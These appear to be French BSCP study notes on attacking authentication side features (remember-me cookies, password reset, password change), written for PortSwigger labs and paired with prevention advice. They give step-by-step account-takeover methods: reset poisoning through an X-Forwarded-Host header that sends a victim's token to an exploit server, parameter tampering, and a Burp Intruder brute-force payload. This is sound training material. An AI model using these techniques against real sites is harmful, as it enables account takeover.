---
tags: [bscp, server-side, authentication]
niveau: practitioner
statut: en cours
---
# Autres mécanismes d'authentification

## En bref
- Au-delà de la page de connexion elle-même, les fonctionnalités annexes liées à l'authentification (rester connecté, réinitialiser le mot de passe, changer le mot de passe, mais aussi inscription, vérification d'adresse e-mail et questions de sécurité) manipulent les mêmes informations sensibles mais sont souvent moins auditées.
- Elles constituent donc une surface d'attaque à part entière : un défaut sur l'une d'elles permet un bypass de l'authentification principale sans jamais avoir à en casser la logique. Elles doivent être rendues aussi robustes que la page de connexion principale.

## Types et variantes
| Type | Idée clé | Signal attendu | Limite | Note | Niveau |
| --- | --- | --- | --- | --- | --- |
| Maintien de la connexion | cookie prévisible, hash MD5 | structure lisible `utilisateur:haché` après décodage | cookie signé ou aléatoire, haché salé, `HttpOnly` contre le vol par script | [[Auth-maintien-connexion]] | Practitioner |
| Réinitialisation du mot de passe | token, `X-Forwarded-Host` | requête de la victime avec son token dans le journal d'accès de l'exploit server | victime qui clique ou client e-mail qui précharge le lien ; domaine d'envoi souvent fixé par configuration | [[Auth-reinitialisation-mot-de-passe]] | Apprentice, Practitioner |
| Modification du mot de passe | champ masqué, oracle d'erreur | un seul message différent parmi les réponses | account lockout si les deux nouveaux mots de passe sont identiques | [[Auth-modification-mot-de-passe]] | Practitioner |

## Comment détecter
- Maintien de la connexion : récupérer le cookie "se souvenir de moi" de plusieurs comptes (y compris via XSS si possible) et les comparer : même longueur ? même préfixe ? même suffixe ? Tester l'encodage (base64, hexadécimal), le haché éventuel (MD5, SHA1, SHA256) en recalculant le haché d'un mot de passe connu, et la présence d'un sel (le même mot de passe donne-t-il le même haché sur deux comptes ?). Chercher un motif prévisible (encodage réversible, concaténation username + timestamp, absence de signature).
- Sur la fonctionnalité de réinitialisation : vérifier si un paramètre (`user`, `username`, `email`) identifie la cible dans l'URL ou le corps de la requête, et s'il est modifiable. Tester aussi un paramètre dupliqué (`email` en double) et un paramètre `email` ajouté dans le corps.
- Avec Burp, intercepter la requête `POST /forgot-password` et tester la prise en compte de headers comme `Host` ou `X-Forwarded-Host` dans la génération du lien envoyé par e-mail (voir [[HTTP-Host-header]]).
- Vérifier si le token de réinitialisation est revalidé au moment de la soumission finale du nouveau mot de passe, ou seulement à l'affichage du formulaire.
- Prévisibilité du token : demander plusieurs tokens successifs pour le même compte et comparer la longueur, l'alphabet, la présence d'un horodatage, la séquentialité ou un haché d'un identifiant connu.
- Autres propriétés du token : expiration (le soumettre après plusieurs minutes), usage unique (le soumettre à nouveau après une réinitialisation réussie), liaison à un compte précis (l'utiliser avec un autre nom d'utilisateur), invalidation des anciens tokens quand un nouveau est demandé.
- Sur la fonctionnalité de changement de mot de passe : vérifier la présence du nom d'utilisateur en champ masqué, et comparer les messages d'erreur retournés selon que le mot de passe actuel ou les nouveaux mots de passe sont corrects ou non (une différence de message permet l'énumération). Vérifier aussi que le mot de passe actuel est exigé et qu'un token anti-CSRF protège la requête (voir [[CSRF]]).

## Comment exploiter (principe)
- **Password reset poisoning via le header Host** : ajouter ou modifier le header `X-Forwarded-Host` (ou `Host`) de la requête `POST /forgot-password` avec un domaine contrôlé par l'attaquant (par exemple un exploit server), puis soumettre le `username` de la victime. Le lien envoyé par e-mail à la victime pointe alors vers ce domaine ; la requête que la victime déclenche en cliquant (ou que l'attaquant intercepte dans les logs d'accès du domaine contrôlé) contient le token valide de la victime, réutilisable pour réinitialiser son mot de passe.
	- Variantes de headers à essayer si `X-Forwarded-Host` est filtré ou ignoré : `Host` modifié, double `Host`, ligne de requête avec URL absolue, `X-Forwarded-Server`, `X-Host`, `Forwarded`.
	- Limites : il faut un clic de la victime, ou un client e-mail qui précharge le lien. Sur une cible réelle, le domaine d'envoi est souvent fixé par configuration ; dans les labs, c'est un composant qui fait confiance au header qui rend l'attaque possible.
- **Bypass par paramètre prévisible** : remplacer directement le paramètre identifiant l'utilisateur (`user=victim`) dans la requête de réinitialisation ou de changement de mot de passe par le nom d'utilisateur de la cible.
- **Bypass par paramètre dupliqué** : envoyer `email=victime@x.tld&email=attaquant@x.tld` pour que le lien de réinitialisation parte aussi vers une adresse contrôlée par l'attaquant.
- **Brute force via message d'erreur distinctif** : sur le changement de mot de passe, le mot de passe actuel est la valeur à deviner. Soumettre un mot de passe actuel candidat avec deux nouveaux mots de passe différents entre eux ; le message `New passwords do not match` n'apparaît que si le candidat est correct, tandis que `Current password is incorrect` apparaît pour les autres. Ce point devient un oracle exploitable avec Burp Intruder, en faisant un brute force sur le paramètre `current-password` tout en fixant l'username à celui de la victime.
- **Vol du cookie persistant par XSS** : si une faille XSS existe par ailleurs, elle peut servir à exfiltrer le cookie "se souvenir de moi" d'un utilisateur ciblé. Ce cas relève du maintien de la connexion, voir [[Auth-maintien-connexion]].

## Pièges et points d'attention BSCP
- Toujours tester la prise en compte de `X-Forwarded-Host` (et variantes : `X-Forwarded-Server`, `X-Host`) sur les endpoints qui génèrent un lien envoyé par e-mail : c'est le vecteur le plus courant de password reset poisoning sur ces labs.
- Ne pas confondre les deux rôles dans le cas du poisoning : le journal d'accès de l'exploit server de l'attaquant capte le token généré pour la victime ; ce token est ensuite utilisé sur le formulaire légitime reçu par e-mail pour son propre compte, en remplaçant la valeur du token. Ce sont deux tokens distincts, l'un provient de la requête de la victime, l'autre est le lien légitime de l'attaquant.
- Vérifier systématiquement si un champ masqué (hidden input) transporte le nom d'utilisateur sur les formulaires de changement de mot de passe : c'est un bypass d'authentification simple à manquer.
- Lors d'un brute force avec Intruder sur le changement de mot de passe, garder les deux nouveaux mots de passe (`new-password-1` et `new-password-2`) différents entre eux : s'ils coïncident, le compte de la victime subit un account lockout au lieu de produire un message exploitable.
- Contrôler que le token de réinitialisation est revalidé à la soumission finale, et pas seulement à l'ouverture du formulaire.

## Prévention
Ne pas se concentrer uniquement sur la page de connexion : les fonctionnalités annexes sont tout aussi exposées et doivent être tout aussi robustes. Points propres à ces fonctionnalités :
- Réinitialisation : générer un token à haute entropie (imprévisible, sans horodatage ni séquence), lié à un compte précis, à usage unique, avec une expiration courte, et le revalider à la soumission finale du nouveau mot de passe.
- Construire l'URL absolue du lien de réinitialisation à partir de la configuration du serveur, jamais à partir des headers `Host` ou `X-Forwarded-Host` de la requête.
- Ne prendre l'identité du compte visé que dans l'état de session ou dans le token, jamais dans un champ masqué ou un paramètre modifiable par le client.
- Modification du mot de passe : exiger le mot de passe actuel, protéger la requête par un token anti-CSRF, et renvoyer le même message d'erreur quel que soit le cas pour ne pas créer d'oracle.
- Maintien de la connexion : utiliser un token aléatoire stocké côté serveur ou signé, jamais un encodage réversible ou un haché non salé du mot de passe ; poser l'attribut `HttpOnly` sur le cookie pour limiter son vol par script.
- Vérifier minutieusement toute logique de validation : de simples failles logiques se glissent facilement dans le code.
- La prévention de la page de connexion (énumération, brute force, politique de mot de passe) est dans [[Authentication]], celle du second facteur dans [[Multi-factor-authentication]].

## Labs PortSwigger
- [x] Apprentice ✅ 2026-10-05
- [x] Practitioner ✅ 2026-10-05

## Journal des labs

### Lab 1 - Empoisonnement de la réinitialisation du mot de passe via un middleware
*Password reset poisoning via middleware* - Practitioner - note : [[Auth-reinitialisation-mot-de-passe]]
Ce lab est vulnérable au password reset poisoning. L'utilisateur `carlos` clique sans vigilance sur tout lien reçu par e-mail. Objectif : se connecter au compte de Carlos. Compte perso : `wiener:peter`. Les e-mails envoyés à ce compte sont lisibles via le client mail de l'exploit server.

1. Avec Burp actif, observer la fonctionnalité de mot de passe oublié : un lien contenant un token de réinitialisation unique est envoyé par e-mail.
2. Envoyer la requête `POST /forgot-password` à Burp Repeater. Constater que l'en-tête `X-Forwarded-Host` est pris en compte et permet de rediriger le lien de réinitialisation généré dynamiquement vers un domaine arbitraire.
3. Récupérer l'URL de son propre exploit server.
4. Dans Repeater, ajouter l'en-tête suivant à la requête :
	`X-Forwarded-Host: VOTRE-ID-EXPLOIT-SERVER.exploit-server.net`
5. Remplacer le paramètre `username` par `carlos` et envoyer la requête.
6. Sur l'exploit server, consulter le journal d'accès (access log) : une requête `GET /forgot-password` y apparaît, contenant le token de la victime en paramètre. Le noter.
7. Dans son propre client mail, copier le lien de réinitialisation légitime (pas celui qui pointe vers l'exploit server), le coller dans le navigateur, puis remplacer la valeur du paramètre `temp-forgot-password-token` par le token volé à la victime.
8. Charger cette URL et définir un nouveau mot de passe pour le compte de Carlos.
9. Se connecter au compte de Carlos avec ce nouveau mot de passe pour valider le lab.

### Lab 2 - Force brute du mot de passe via la modification du mot de passe
*Password brute-force via password change* - Practitioner - note : [[Auth-modification-mot-de-passe]]
La fonctionnalité de changement de mot de passe de ce lab est vulnérable au brute-force. Objectif : utiliser une liste de mots de passe candidats pour retrouver celui de Carlos et accéder à sa page "My account".

- Compte perso : `wiener:peter`
- Compte victime : `carlos`
- [Liste des mots de passe candidats](https://portswigger.net/web-security/authentication/auth-lab-passwords)

1. Avec Burp actif, se connecter et tester la fonctionnalité de changement de mot de passe. Constater que le nom d'utilisateur est transmis via un champ masqué (hidden input) de la requête.
2. Observer le comportement en cas de mot de passe actuel erroné : si les deux nouveaux mots de passe saisis correspondent, le compte est verrouillé. Mais si les deux nouveaux mots de passe diffèrent, le message retourné est simplement `Current password is incorrect`. Si le mot de passe actuel est correct mais les deux nouveaux diffèrent, le message devient `New passwords do not match`. Cette différence de message permet d'énumérer le bon mot de passe actuel.
3. Saisir son propre mot de passe actuel correct et deux nouveaux mots de passe différents entre eux. Envoyer cette requête `POST /my-account/change-password` à Burp Intruder.
4. Dans Intruder, remplacer le paramètre `username` par `carlos` et placer un payload sur le paramètre `current-password`, en laissant les deux nouveaux mots de passe différents. Exemple :
	`username=carlos&current-password=§mot-de-passe-incorrect§&new-password-1=123&new-password-2=abc`
5. Dans le panneau **Payloads**, charger la liste des mots de passe candidats comme jeu de payloads.
6. Dans **Settings**, ajouter une règle de grep match pour repérer les réponses contenant `New passwords do not match`, puis lancer l'attaque.
7. À la fin de l'attaque, une seule réponse doit correspondre à ce message. Noter le mot de passe candidat associé.
8. Dans le navigateur, se déconnecter de son propre compte et se reconnecter avec le nom d'utilisateur `carlos` et le mot de passe identifié.
9. Cliquer sur **My account** pour valider le lab.

## Mes notes
- Les labs sur le cookie persistant, le craquage hors ligne et la logique de réinitialisation sont dans le journal de [[Authentication]].

## Liens
- [[Auth-maintien-connexion]]
- [[Auth-reinitialisation-mot-de-passe]]
- [[Auth-modification-mot-de-passe]]
- [[Authentication]]
- [[HTTP-Host-header]] - headers Host et empoisonnement du lien de réinitialisation
- [[CSRF]] - requête de changement de mot de passe sans token anti-CSRF
- [[Multi-factor-authentication]]
